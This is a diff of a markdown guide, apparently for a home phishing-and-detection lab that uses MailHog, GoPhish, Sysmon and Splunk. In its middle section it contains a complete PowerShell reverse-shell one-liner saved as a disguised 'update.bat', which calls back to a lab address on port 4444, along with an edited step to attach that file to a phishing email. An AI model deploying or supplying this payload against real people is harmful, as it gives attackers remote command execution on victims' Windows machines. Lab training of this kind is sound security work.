@@ -230,7 +230,7 @@ Save and Apply
 
 ---
 
-### Installing MailHog on Kali Linux
+### Installing MailHog 
 
 **Step 1 — Install Go:**
 
@@ -266,7 +266,7 @@ http://192.168.2.5:8025
 
 ---
 
-### Installing GoPhish on Kali Linux
+### Installing GoPhish 
 
 **Step 1 — Download GoPhish:**
 
@@ -303,22 +303,18 @@ Password: from terminal output
 
 The malicious batch file establishes a reverse shell from Windows Server back to Kali.
 
-**Step 1 — Open Notepad as Administrator on Windows Server**
+**Step 1 — Create the malicious on kali linux and attach it to email**
 
 **Step 2 — Type the following exactly:**
 
 ```batch
 @echo off
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.2.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,([text.encoding]::ASCII).GetBytes($sb).Length)};$c.Close()"
-```
 
-**Step 3 — Save the file:**
 
-```
-File > Save As
-File name:    update.bat
-Save as type: All Files
-Location:     C:\Users\Administrator\Downloads
+Save as:    update.bat
+
+
 ```
 
 **What the payload does:**
@@ -377,7 +373,7 @@ Restart-Service sysmon64
 
 ---
 
-### Installing Splunk on Kali Linux
+### Installing Splunk 
 
 **Step 1 — Install Splunk:**
 
